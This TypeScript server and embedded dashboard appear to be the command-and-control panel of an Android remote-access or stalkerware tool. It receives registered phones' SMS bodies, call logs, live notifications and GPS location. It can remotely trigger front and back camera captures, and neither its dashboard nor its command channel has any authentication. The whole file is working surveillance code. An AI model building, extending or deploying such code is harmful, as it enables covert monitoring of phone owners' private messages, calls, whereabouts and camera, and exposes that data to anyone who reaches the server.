import http from "http";
import { WebSocketServer, WebSocket } from "ws";

const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 8080;

const HEARTBEAT_INTERVAL_MS = 15000;
const STALE_AFTER_MS        = 60000;

// ----------------------------------------------------------------
// TYPES
// ----------------------------------------------------------------

interface DeviceLocation {
  latitude: number; longitude: number;
  accuracy?: number; altitude?: number; speed?: number; timestamp?: number;
}

interface DeviceTelemetry {
  networkType: string; wifiSSID: string;
  totalRamMb: number; availRamMb: number; usedRamMb: number; isLowMem: boolean;
  totalStorageGb: number; availStorageGb: number; isScreenOn: boolean;
}

interface CallLogEntry {
  number: string; type: string; date: number; duration: number; name: string;
}

interface SmsEntry {
  address: string; body: string; date: number; type: string; read: boolean;
}

interface NotificationEntry {
  package: string; title: string; text: string; timestamp: number; id: string;
}

interface DeviceInfo {
  manufacturer: string; model: string; androidVersion: string; sdkInt: number;
  batteryLevel?: number; isCharging?: boolean;
  location?: DeviceLocation; telemetry?: DeviceTelemetry;
  callLog?: CallLogEntry[]; recentSms?: SmsEntry[];
  recentNotifications?: NotificationEntry[];
  lastCapturedPhoto?: string;
}

interface ExtWebSocket extends WebSocket {
  lastSeen: number;
  deviceId?: string;
  clientType?: "PHONE" | "DASHBOARD";
}

// ----------------------------------------------------------------
// DASHBOARD HTML
// ----------------------------------------------------------------

const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PhoneBridge Dashboard</title>
  <style>
    * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    body { background: #0f172a; color: #f8fafc; margin: 0; padding: 24px; }
    header { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #334155; padding-bottom: 16px; margin-bottom: 24px; }
    h1 { margin: 0; font-size: 22px; font-weight: 700; color: #38bdf8; }
    .status-badge { background: #1e293b; padding: 6px 12px; border-radius: 9999px; font-size: 13px; border: 1px solid #475569; }
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 16px; }
    .card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
    .card h2 { margin: 0 0 8px 0; font-size: 18px; color: #f1f5f9; }
    .device-meta { font-size: 13px; color: #94a3b8; margin-bottom: 14px; line-height: 1.5; }
    .meta-tag { font-family: monospace; font-size: 11px; background: #0f172a; padding: 2px 6px; border-radius: 4px; }
    .telemetry-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px; }
    .tele-stat { background: #090d16; border: 1px solid #1e293b; border-radius: 6px; padding: 8px; font-size: 11px; }
    .tele-stat .label { color: #64748b; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
    .tele-stat .val { color: #f1f5f9; font-weight: 600; font-family: monospace; margin-top: 2px; }
    .loc-box { background: #090d16; border: 1px solid #1e293b; border-radius: 6px; padding: 10px; margin-top: 10px; font-size: 12px; font-family: monospace; color: #38bdf8; }
    .loc-box a { color: #f59e0b; text-decoration: underline; margin-top: 4px; display: inline-block; font-weight: bold; }
    .notif-panel { background: #090d16; border: 1px solid #1e293b; border-radius: 6px; padding: 8px; margin-top: 10px; max-height: 120px; overflow-y: auto; }
    .notif-panel .notif-item { font-size: 11px; padding: 4px 0; border-bottom: 1px solid #1e293b; color: #cbd5e1; }
    .notif-panel .notif-item:last-child { border-bottom: none; }
    .notif-panel .notif-pkg  { color: #38bdf8; font-family: monospace; font-size: 10px; }
    .notif-panel .notif-title { font-weight: 600; color: #f1f5f9; }
    .notif-panel .notif-text  { color: #94a3b8; }
    .notif-empty { color: #475569; font-size: 11px; font-style: italic; }
    .actions { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 16px; }
    button { background: #2563eb; color: white; border: none; padding: 8px 12px; border-radius: 6px; font-size: 12px; font-weight: 500; cursor: pointer; transition: background 0.15s; }
    button:hover { background: #1d4ed8; }
    button.locate  { background: #059669; } button.locate:hover  { background: #047857; }
    button.tele    { background: #7c3aed; } button.tele:hover    { background: #6d28d9; }
    button.cam     { background: #0284c7; } button.cam:hover     { background: #0369a1; }
    button.torch-off { background: #475569; } button.torch-off:hover { background: #334155; }
    button.alarm-on  { background: #dc2626; } button.alarm-on:hover  { background: #b91c1c; }
    button.alarm-off { background: #64748b; } button.alarm-off:hover { background: #475569; }
    button.data-btn  { background: #0f766e; } button.data-btn:hover  { background: #0d9488; }
    .log-box { margin-top: 24px; background: #020617; border: 1px solid #1e293b; border-radius: 8px; padding: 12px; height: 180px; overflow-y: auto; font-family: monospace; font-size: 12px; color: #a5f3fc; }
    /* Modals */
    .modal-backdrop { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 100; align-items: center; justify-content: center; }
    .modal-backdrop.active { display: flex; }
    .modal-content { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 20px; max-width: 90vw; width: 560px; max-height: 90vh; display: flex; flex-direction: column; }
    .modal-content img { max-width: 100%; max-height: 70vh; border-radius: 8px; border: 1px solid #0f172a; object-fit: contain; }
    .modal-list { overflow-y: auto; flex: 1; margin-top: 12px; }
    .modal-row { padding: 10px; border-bottom: 1px solid #334155; font-size: 13px; }
    .modal-row:last-child { border-bottom: none; }
    .row-top { display: flex; justify-content: space-between; margin-bottom: 4px; }
    .row-name { font-weight: 600; color: #f1f5f9; }
    .row-meta { font-size: 11px; color: #64748b; font-family: monospace; }
    .row-type-INCOMING  { color: #4ade80; } .row-type-OUTGOING { color: #38bdf8; }
    .row-type-MISSED    { color: #f87171; } .row-type-REJECTED { color: #fb923c; }
    .row-type-INBOX { color: #4ade80; } .row-type-SENT { color: #38bdf8; }
    .sms-body { color: #cbd5e1; font-size: 12px; margin-top: 4px; white-space: pre-wrap; word-break: break-word; }
    .unread-dot { display: inline-block; width: 7px; height: 7px; background: #38bdf8; border-radius: 50%; margin-right: 5px; vertical-align: middle; }
    .modal-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 12px; }
  </style>
</head>
<body>
  <header>
    <h1>PhoneBridge Command Deck</h1>
    <div class="status-badge" id="deckStatus">Connecting to deck...</div>
  </header>
  <main>
    <div class="grid" id="deviceList">
      <div style="color:#64748b;font-size:14px;">No phones connected yet.</div>
    </div>
    <h3 style="margin-top:28px;margin-bottom:8px;font-size:14px;color:#94a3b8;">Event Activity</h3>
    <div class="log-box" id="activityLog"></div>
  </main>

  <!-- Photo Modal -->
  <div class="modal-backdrop" id="photoModal" onclick="closePhotoModal()">
    <div class="modal-content" onclick="event.stopPropagation()" style="text-align:center;">
      <h3 id="modalTitle" style="margin-top:0;color:#f8fafc;font-size:16px;">Captured Frame</h3>
      <img id="modalImg" src="" alt="Captured Frame"/>
      <div class="modal-footer">
        <a id="downloadLink" download="capture.jpg" style="color:#38bdf8;font-size:13px;text-decoration:none;">Download Image</a>
        <button onclick="closePhotoModal()" style="background:#475569;">Close</button>
      </div>
    </div>
  </div>

  <!-- Call Log Modal -->
  <div class="modal-backdrop" id="callLogModal" onclick="closeCallLogModal()">
    <div class="modal-content" onclick="event.stopPropagation()">
      <h3 style="margin-top:0;color:#f8fafc;font-size:16px;">📋 Call Log</h3>
      <div class="modal-list" id="callLogContent"><div style="color:#64748b;padding:20px;text-align:center;">No data yet. Press Get Call Log in the device card.</div></div>
      <div class="modal-footer">
        <span id="callLogCount" style="font-size:12px;color:#64748b;"></span>
        <button onclick="closeCallLogModal()" style="background:#475569;">Close</button>
      </div>
    </div>
  </div>

  <!-- SMS Modal -->
  <div class="modal-backdrop" id="smsModal" onclick="closeSmsModal()">
    <div class="modal-content" onclick="event.stopPropagation()">
      <h3 style="margin-top:0;color:#f8fafc;font-size:16px;">💬 SMS Messages</h3>
      <div class="modal-list" id="smsContent"><div style="color:#64748b;padding:20px;text-align:center;">No data yet. Press Get SMS in the device card.</div></div>
      <div class="modal-footer">
        <span id="smsCount" style="font-size:12px;color:#64748b;"></span>
        <button onclick="closeSmsModal()" style="background:#475569;">Close</button>
      </div>
    </div>
  </div>

  <script>
    const protocol = location.protocol === "https:" ? "wss://" : "ws://";
    const ws = new WebSocket(protocol + location.host);
    const deviceListEl   = document.getElementById("deviceList");
    const deckStatusEl   = document.getElementById("deckStatus");
    const activityLogEl  = document.getElementById("activityLog");

    // Per-device stores (kept client-side only)
    const deviceCallLogs  = {};
    const deviceSmsData   = {};
    const deviceNotifs    = {};

    function logEvent(text) {
      const line = document.createElement("div");
      line.textContent = "[" + new Date().toLocaleTimeString() + "] " + text;
      activityLogEl.prepend(line);
    }

    function fmtDate(ms) {
      if (!ms) return "—";
      const d = new Date(ms);
      return d.toLocaleDateString() + " " + d.toLocaleTimeString();
    }
    function fmtDuration(secs) {
      if (!secs) return "0s";
      const m = Math.floor(secs / 60), s = secs % 60;
      return m > 0 ? m + "m " + s + "s" : s + "s";
    }

    // ---- Photo modal ----
    function showPhotoModal(title, base64Data) {
      const src = base64Data.startsWith("data:") ? base64Data : "data:image/jpeg;base64," + base64Data;
      document.getElementById("modalTitle").textContent = title;
      document.getElementById("modalImg").src = src;
      document.getElementById("downloadLink").href = src;
      document.getElementById("photoModal").classList.add("active");
    }
    function closePhotoModal() { document.getElementById("photoModal").classList.remove("active"); }

    // ---- Call log modal ----
    function showCallLog(deviceId) {
      const entries = deviceCallLogs[deviceId] || [];
      const el = document.getElementById("callLogContent");
      document.getElementById("callLogCount").textContent = entries.length + " entries";
      if (entries.length === 0) {
        el.innerHTML = '<div style="color:#64748b;padding:20px;text-align:center;">No call log data. Press Get Call Log.</div>';
      } else {
        el.innerHTML = entries.map(e => {
          const name = e.name ? e.name : e.number;
          const sub  = e.name ? e.number : "";
          return '<div class="modal-row">' +
            '<div class="row-top">' +
              '<span class="row-name">' + escHtml(name) + '</span>' +
              '<span class="row-meta row-type-' + e.type + '">' + e.type + ' · ' + fmtDuration(e.duration) + '</span>' +
            '</div>' +
            (sub ? '<div class="row-meta">' + escHtml(sub) + '</div>' : '') +
            '<div class="row-meta">' + fmtDate(e.date) + '</div>' +
          '</div>';
        }).join("");
      }
      document.getElementById("callLogModal").classList.add("active");
    }
    function closeCallLogModal() { document.getElementById("callLogModal").classList.remove("active"); }

    // ---- SMS modal ----
    function showSms(deviceId) {
      const entries = deviceSmsData[deviceId] || [];
      const el = document.getElementById("smsContent");
      document.getElementById("smsCount").textContent = entries.length + " messages";
      if (entries.length === 0) {
        el.innerHTML = '<div style="color:#64748b;padding:20px;text-align:center;">No SMS data. Press Get SMS.</div>';
      } else {
        el.innerHTML = entries.map(e => {
          return '<div class="modal-row">' +
            '<div class="row-top">' +
              '<span class="row-name">' +
                (!e.read ? '<span class="unread-dot"></span>' : '') +
                escHtml(e.address) +
              '</span>' +
              '<span class="row-meta row-type-' + e.type + '">' + e.type + '</span>' +
            '</div>' +
            '<div class="row-meta">' + fmtDate(e.date) + '</div>' +
            '<div class="sms-body">' + escHtml(e.body) + '</div>' +
          '</div>';
        }).join("");
      }
      document.getElementById("smsModal").classList.add("active");
    }
    function closeSmsModal() { document.getElementById("smsModal").classList.remove("active"); }

    function escHtml(s) {
      return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
    }

    // ---- WebSocket ----
    ws.onopen = () => {
      deckStatusEl.textContent = "● Deck Connected";
      deckStatusEl.style.borderColor = "#22c55e";
      deckStatusEl.style.color = "#4ade80";
      ws.send(JSON.stringify({ type: "REGISTER_DASHBOARD" }));
      logEvent("Dashboard authenticated with server.");
    };
    ws.onclose = () => {
      deckStatusEl.textContent = "● Deck Offline";
      deckStatusEl.style.borderColor = "#ef4444";
      deckStatusEl.style.color = "#f87171";
      logEvent("Lost connection to server.");
    };

    ws.onmessage = (event) => {
      const msg = JSON.parse(event.data);

      if (msg.type === "DEVICE_UPDATE") {
        renderDevices(msg.devices);
      } else if (msg.type === "ACTIVITY") {
        logEvent(msg.message);
      } else if (msg.type === "PHOTO_RECEIVED") {
        logEvent("Photo received from " + msg.deviceId.slice(0,8) + " (" + msg.lens + ")");
        showPhotoModal("Capture (" + msg.lens + ") – " + msg.deviceId.slice(0,8), msg.image);
      } else if (msg.type === "CALL_LOG_RECEIVED") {
        deviceCallLogs[msg.deviceId] = msg.entries;
        logEvent("Call log received from " + msg.deviceId.slice(0,8) + " (" + msg.entries.length + " entries)");
      } else if (msg.type === "SMS_RECEIVED") {
        deviceSmsData[msg.deviceId] = msg.entries;
        const unread = msg.entries.filter(e => !e.read).length;
        logEvent("SMS received from " + msg.deviceId.slice(0,8) + " (" + msg.entries.length + " messages, " + unread + " unread)");
      } else if (msg.type === "NOTIFICATION_RECEIVED") {
        const id  = msg.deviceId;
        const notif = msg.notification;
        if (!deviceNotifs[id]) deviceNotifs[id] = [];
        deviceNotifs[id].unshift(notif);
        if (deviceNotifs[id].length > 20) deviceNotifs[id].length = 20;
        // Update just the notification panel of this device card
        const panel = document.getElementById("notif-panel-" + id);
        if (panel) renderNotifPanel(panel, id);
        logEvent("🔔 " + id.slice(0,8) + " [" + notif.package + "] " + notif.title + ": " + notif.text);
      }
    };

    function sendCommand(deviceId, command) {
      ws.send(JSON.stringify({ type: "DASHBOARD_COMMAND", deviceId, command }));
      logEvent("Dispatched " + command + " to " + deviceId.slice(0,8) + "...");
    }

    function renderNotifPanel(el, deviceId) {
      const notifs = deviceNotifs[deviceId] || [];
      if (notifs.length === 0) {
        el.innerHTML = '<div class="notif-empty">No notifications yet.</div>';
        return;
      }
      el.innerHTML = notifs.map(n =>
        '<div class="notif-item">' +
          '<span class="notif-pkg">' + escHtml(n.package) + '</span> ' +
          '<span class="notif-title">' + escHtml(n.title) + '</span>' +
          (n.text ? ': <span class="notif-text">' + escHtml(n.text.slice(0,80)) + '</span>' : '') +
        '</div>'
      ).join("");
    }

    function renderDevices(devices) {
      if (devices.length === 0) {
        deviceListEl.innerHTML = '<div style="color:#64748b;font-size:14px;">No phones connected.</div>';
        return;
      }
      deviceListEl.innerHTML = devices.map(d => {
        const batteryStr = d.batteryLevel !== undefined
          ? d.batteryLevel + "%" + (d.isCharging ? " (Charging)" : "")
          : "Unknown";
        const t = d.telemetry;
        const telemetryHtml = t ? \`
          <div class="telemetry-grid">
            <div class="tele-stat"><div class="label">Network / SSID</div><div class="val">\${t.networkType} \${t.wifiSSID !== "N/A" ? "(" + t.wifiSSID + ")" : ""}</div></div>
            <div class="tele-stat"><div class="label">Screen State</div><div class="val" style="color:\${t.isScreenOn ? '#4ade80' : '#94a3b8'}">\${t.isScreenOn ? "ON" : "OFF (Locked)"}</div></div>
            <div class="tele-stat"><div class="label">RAM Usage</div><div class="val">\${t.usedRamMb}MB / \${t.totalRamMb}MB</div></div>
            <div class="tele-stat"><div class="label">Free Storage</div><div class="val">\${t.availStorageGb}GB / \${t.totalStorageGb}GB</div></div>
          </div>\` : '';
        const locHtml = d.location
          ? \`<div class="loc-box"><div>GPS: \${d.location.latitude.toFixed(6)}, \${d.location.longitude.toFixed(6)}</div><div>Accuracy: ±\${d.location.accuracy ? d.location.accuracy.toFixed(1) : "?"}m</div><a href="https://www.google.com/maps?q=\${d.location.latitude},\${d.location.longitude}" target="_blank">Open in Google Maps →</a></div>\`
          : '<div class="loc-box" style="color:#64748b;">GPS: Not acquired yet</div>';
        return \`
          <div class="card">
            <h2>\${d.manufacturer || "Android"} \${d.model || "Device"}</h2>
            <div class="device-meta">
              <div>OS: Android \${d.androidVersion || "?"} (SDK \${d.sdkInt || "?"})</div>
              <div>Battery: \${batteryStr}</div>
              <div style="margin-top:4px;">ID: <span class="meta-tag">\${d.id}</span></div>
              \${telemetryHtml}
              \${locHtml}
            </div>
            <div style="margin-top:10px;">
              <div style="font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;">Live Notifications</div>
              <div class="notif-panel" id="notif-panel-\${d.id}"><div class="notif-empty">No notifications yet.</div></div>
            </div>
            <div class="actions">
              <button class="cam"      onclick="sendCommand('\${d.id}','CAPTURE_PHOTO_BACK')">📸 Back Cam</button>
              <button class="cam"      onclick="sendCommand('\${d.id}','CAPTURE_PHOTO_FRONT')">🤳 Front Cam</button>
              <button class="tele"     onclick="sendCommand('\${d.id}','GET_TELEMETRY')">Sync Telemetry</button>
              <button class="locate"   onclick="sendCommand('\${d.id}','GET_LOCATION')">Locate</button>
              <button class="data-btn" onclick="sendCommand('\${d.id}','GET_CALL_LOG');logEvent('Fetching call log...')">📋 Call Log</button>
              <button class="data-btn" onclick="sendCommand('\${d.id}','GET_SMS');logEvent('Fetching SMS...')">💬 SMS</button>
              <button onclick="showCallLog('\${d.id}')">View Calls</button>
              <button onclick="showSms('\${d.id}')">View SMS</button>
              <button onclick="sendCommand('\${d.id}','PING')">Ping</button>
              <button onclick="sendCommand('\${d.id}','VIBRATE')">Vibrate</button>
              <button onclick="sendCommand('\${d.id}','TORCH_ON')">Torch ON</button>
              <button class="torch-off" onclick="sendCommand('\${d.id}','TORCH_OFF')">Torch OFF</button>
              <button class="alarm-on"  onclick="sendCommand('\${d.id}','ALARM_START')">Ring Alarm</button>
              <button class="alarm-off" onclick="sendCommand('\${d.id}','ALARM_STOP')">Stop Alarm</button>
            </div>
          </div>\`;
      }).join("");

      // Re-populate notification panels after re-render
      devices.forEach(d => {
        const panel = document.getElementById("notif-panel-" + d.id);
        if (panel) renderNotifPanel(panel, d.id);
      });
    }
  </script>
</body>
</html>`;

// ----------------------------------------------------------------
// HTTP + WSS SERVER
// ----------------------------------------------------------------

const httpServer = http.createServer((req, res) => {
  if (req.url === "/health") { res.writeHead(200, { "Content-Type": "text/plain" }); res.end("OK"); return; }
  res.writeHead(200, { "Content-Type": "text/html" });
  res.end(DASHBOARD_HTML);
});

const wss = new WebSocketServer({ server: httpServer, maxPayload: 15 * 1024 * 1024 });

const connectedDevices = new Map<string, ExtWebSocket>();
const deviceRegistry   = new Map<string, DeviceInfo>();
const dashboardSockets = new Set<ExtWebSocket>();

function broadcastToDashboards(messageObj: object) {
  const payload = JSON.stringify(messageObj);
  dashboardSockets.forEach(dash => { if (dash.readyState === WebSocket.OPEN) dash.send(payload); });
}

function pushDeviceListUpdate() {
  const devices: Array<{ id: string } & Partial<DeviceInfo>> = [];
  connectedDevices.forEach((_, id) => {
    const info = deviceRegistry.get(id) || { manufacturer: "Unknown", model: "Device", androidVersion: "?", sdkInt: 0 };
    devices.push({ id, ...info });
  });
  broadcastToDashboards({ type: "DEVICE_UPDATE", devices });
}

// ----------------------------------------------------------------
// LIVENESS SWEEPER
// ----------------------------------------------------------------

const pingInterval = setInterval(() => {
  const now = Date.now();
  wss.clients.forEach(ws => {
    const extWs = ws as ExtWebSocket;
    const silentMs = now - extWs.lastSeen;
    if (silentMs > STALE_AFTER_MS) {
      if (extWs.deviceId && connectedDevices.get(extWs.deviceId) === extWs) {
        connectedDevices.delete(extWs.deviceId);
        deviceRegistry.delete(extWs.deviceId);
        console.log(`[Heartbeat] Removed unresponsive device: ${extWs.deviceId} (silent ${Math.round(silentMs/1000)}s)`);
        pushDeviceListUpdate();
        broadcastToDashboards({ type: "ACTIVITY", message: `Device ${extWs.deviceId.slice(0,8)} timed out (silent ${Math.round(silentMs/1000)}s)` });
      }
      return extWs.terminate();
    }
    if (extWs.readyState === WebSocket.OPEN) extWs.ping();
  });
}, HEARTBEAT_INTERVAL_MS);

wss.on("close", () => clearInterval(pingInterval));

// ----------------------------------------------------------------
// CONNECTIONS
// ----------------------------------------------------------------

wss.on("connection", (socket: WebSocket) => {
  const extWs = socket as ExtWebSocket;
  extWs.lastSeen = Date.now();
  const markSeen = () => { extWs.lastSeen = Date.now(); };

  extWs.on("pong", markSeen);
  extWs.on("ping", markSeen);

  extWs.on("message", (data) => {
    markSeen();
    try {
      const parsed = JSON.parse(data.toString());

      // ---- Dashboard ----
      if (parsed.type === "REGISTER_DASHBOARD") {
        extWs.clientType = "DASHBOARD";
        dashboardSockets.add(extWs);
        console.log("[Deck] Browser dashboard connected.");
        pushDeviceListUpdate();
        return;
      }

      if (parsed.type === "DASHBOARD_COMMAND") {
        const targetId = parsed.deviceId;
        const command  = parsed.command;
        const targetSocket = connectedDevices.get(targetId);
        if (!targetSocket || targetSocket.readyState !== WebSocket.OPEN) {
          connectedDevices.delete(targetId);
          deviceRegistry.delete(targetId);
          pushDeviceListUpdate();
          broadcastToDashboards({ type: "ACTIVITY", message: `Command failed: Device ${targetId.slice(0,8)} is offline.` });
          return;
        }
        targetSocket.send(JSON.stringify({ type: "COMMAND", command }));
        console.log(`[Deck -> Phone] Dispatched ${command} to ${targetId}`);
        return;
      }

      // ---- Phone registration ----
      if (parsed.type === "REGISTER_DEVICE") {
        extWs.clientType = "PHONE";
        const devId = parsed.deviceId;
        if (!devId) return;
        extWs.deviceId = devId;
        const oldSocket = connectedDevices.get(devId);
        if (oldSocket && oldSocket !== extWs) oldSocket.terminate();
        connectedDevices.set(devId, extWs);
        console.log(`Device registered: ${devId}`);
        extWs.send(JSON.stringify({ type: "REGISTRATION_SUCCESS", deviceId: devId }));
        extWs.send(JSON.stringify({ type: "COMMAND", command: "GET_DEVICE_INFO" }));
        extWs.send(JSON.stringify({ type: "COMMAND", command: "GET_BATTERY" }));
        pushDeviceListUpdate();
        broadcastToDashboards({ type: "ACTIVITY", message: `Device connected: ${devId.slice(0,8)}...` });
        return;
      }

      // All messages below require an identified phone
      if (!extWs.deviceId) return;
      const devId = extWs.deviceId;

      // ---- Diagnostics ----
      if (parsed.type === "SERVICE_EVENT") {
        const event = parsed.event || "UNKNOWN_SERVICE_EVENT";
        console.log(`[Service Diagnostic] ${devId}: ${event}`);
        broadcastToDashboards({ type: "ACTIVITY", message: `SERVICE ${devId.slice(0,8)}: ${event}` });
        return;
      }

      // ---- Device info ----
      if (parsed.type === "DEVICE_INFO") {
        const current = deviceRegistry.get(devId) || { manufacturer: parsed.manufacturer, model: parsed.model, androidVersion: parsed.androidVersion, sdkInt: parsed.sdkInt };
        current.manufacturer = parsed.manufacturer;
        current.model = parsed.model;
        current.androidVersion = parsed.androidVersion;
        current.sdkInt = parsed.sdkInt;
        deviceRegistry.set(devId, current);
        pushDeviceListUpdate();
        return;
      }

      // ---- Battery ----
      if (parsed.type === "BATTERY_INFO") {
        const current = deviceRegistry.get(devId) || { manufacturer: "Unknown", model: "Device", androidVersion: "?", sdkInt: 0 };
        current.batteryLevel = parsed.level;
        current.isCharging   = parsed.isCharging;
        deviceRegistry.set(devId, current);
        pushDeviceListUpdate();
        return;
      }

      // ---- Telemetry ----
      if (parsed.type === "TELEMETRY_DATA") {
        const current = deviceRegistry.get(devId) || { manufacturer: "Unknown", model: "Device", androidVersion: "?", sdkInt: 0 };
        current.telemetry = { networkType: parsed.networkType, wifiSSID: parsed.wifiSSID, totalRamMb: parsed.totalRamMb, availRamMb: parsed.availRamMb, usedRamMb: parsed.usedRamMb, isLowMem: parsed.isLowMem, totalStorageGb: parsed.totalStorageGb, availStorageGb: parsed.availStorageGb, isScreenOn: parsed.isScreenOn };
        deviceRegistry.set(devId, current);
        pushDeviceListUpdate();
        broadcastToDashboards({ type: "ACTIVITY", message: `Telemetry synced from ${devId.slice(0,8)}: ${parsed.networkType}, RAM: ${parsed.usedRamMb}/${parsed.totalRamMb}MB` });
        return;
      }

      // ---- Location ----
      if (parsed.type === "LOCATION_DATA") {
        const current = deviceRegistry.get(devId) || { manufacturer: "Unknown", model: "Device", androidVersion: "?", sdkInt: 0 };
        current.location = { latitude: parsed.latitude, longitude: parsed.longitude, accuracy: parsed.accuracy, altitude: parsed.altitude, speed: parsed.speed, timestamp: parsed.timestamp };
        deviceRegistry.set(devId, current);
        pushDeviceListUpdate();
        broadcastToDashboards({ type: "ACTIVITY", message: `Location received from ${devId.slice(0,8)}: ${parsed.latitude.toFixed(4)}, ${parsed.longitude.toFixed(4)}` });
        return;
      }

      // ---- Call log ----
      if (parsed.type === "CALL_LOG_DATA") {
        const entries: CallLogEntry[] = parsed.entries || [];
        const current = deviceRegistry.get(devId);
        if (current) current.callLog = entries;
        console.log(`[CallLog] ${devId}: ${entries.length} entries`);
        broadcastToDashboards({ type: "CALL_LOG_RECEIVED", deviceId: devId, entries });
        broadcastToDashboards({ type: "ACTIVITY", message: `Call log from ${devId.slice(0,8)}: ${entries.length} entries` });
        return;
      }

      // ---- SMS ----
      if (parsed.type === "SMS_DATA") {
        const entries: SmsEntry[] = parsed.entries || [];
        const current = deviceRegistry.get(devId);
        if (current) current.recentSms = entries;
        const unread = entries.filter(e => !e.read).length;
        console.log(`[SMS] ${devId}: ${entries.length} messages, ${unread} unread`);
        broadcastToDashboards({ type: "SMS_RECEIVED", deviceId: devId, entries });
        broadcastToDashboards({ type: "ACTIVITY", message: `SMS from ${devId.slice(0,8)}: ${entries.length} messages (${unread} unread)` });
        return;
      }

      // ---- Notifications (push) ----
      if (parsed.type === "NOTIFICATION_DATA") {
        const notif: NotificationEntry = parsed.notification;
        if (!notif) return;
        const current = deviceRegistry.get(devId);
        if (current) {
          if (!current.recentNotifications) current.recentNotifications = [];
          current.recentNotifications.unshift(notif);
          if (current.recentNotifications.length > 20) current.recentNotifications.length = 20;
        }
        broadcastToDashboards({ type: "NOTIFICATION_RECEIVED", deviceId: devId, notification: notif });
        return;
      }

      // ---- Photos ----
      if (parsed.type === "PHOTO_DATA" || parsed.type === "IMAGE_CAPTURE") {
        const base64Image = parsed.image || parsed.data || parsed.base64;
        const lensFacing  = parsed.lens || parsed.camera || "CAMERA";
        if (base64Image) {
          const current = deviceRegistry.get(devId);
          if (current) current.lastCapturedPhoto = base64Image;
          broadcastToDashboards({ type: "PHOTO_RECEIVED", deviceId: devId, lens: lensFacing, image: base64Image });
          broadcastToDashboards({ type: "ACTIVITY", message: `Photo captured via ${lensFacing} by ${devId.slice(0,8)}` });
        }
        return;
      }

      if (parsed.type === "CAMERA_ERROR")   { broadcastToDashboards({ type: "ACTIVITY", message: `Camera error from ${devId.slice(0,8)}: ${parsed.error}` }); return; }
      if (parsed.type === "LOCATION_ERROR") { broadcastToDashboards({ type: "ACTIVITY", message: `Location failed for ${devId.slice(0,8)}: ${parsed.error}` }); return; }
      if (parsed.type === "COMMAND_ACK")    { broadcastToDashboards({ type: "ACTIVITY", message: `Device ${devId.slice(0,8)} completed ${parsed.command} (${parsed.status})` }); return; }
      if (parsed.type === "PONG")           { broadcastToDashboards({ type: "ACTIVITY", message: `Pong from ${devId.slice(0,8)} – Online` }); return; }

    } catch (err) {
      console.error("Failed to parse incoming WS message:", err);
    }
  });

  socket.on("close", (code: number, reason: Buffer) => {
    if (extWs.clientType === "DASHBOARD") {
      dashboardSockets.delete(extWs);
      console.log("[Deck] Browser dashboard disconnected.");
    } else if (extWs.deviceId) {
      const devId = extWs.deviceId;
      if (connectedDevices.get(devId) === extWs) {
        connectedDevices.delete(devId);
        deviceRegistry.delete(devId);
        const silentS = Math.round((Date.now() - extWs.lastSeen) / 1000);
        console.log(`Device disconnected: ${devId} (code=${code} reason="${reason.toString()}" lastSeen=${silentS}s ago)`);
        pushDeviceListUpdate();
        broadcastToDashboards({ type: "ACTIVITY", message: `Device disconnected: ${devId.slice(0,8)}... (code ${code}, last seen ${silentS}s ago)` });
      }
    }
  });

  socket.on("error", (err) => { console.error("Socket error:", err); });
});

httpServer.listen(PORT, () => {
  console.log(`PhoneBridge server & dashboard running on port ${PORT}`);
});